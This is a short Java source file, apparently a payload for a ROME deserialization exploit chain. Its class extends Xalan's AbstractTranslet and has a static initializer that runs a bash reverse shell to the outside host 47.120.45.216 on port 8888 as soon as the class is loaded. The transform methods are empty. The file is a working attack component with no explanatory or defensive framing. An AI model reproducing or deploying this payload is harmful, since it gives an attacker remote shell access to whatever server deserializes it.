package com.yyjccc.rome;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class MyClass extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
	static {
		try {
			String[] cmd=new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/47.120.45.216/8888 0>&1"};
			Runtime.getRuntime().exec(cmd);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

	}
}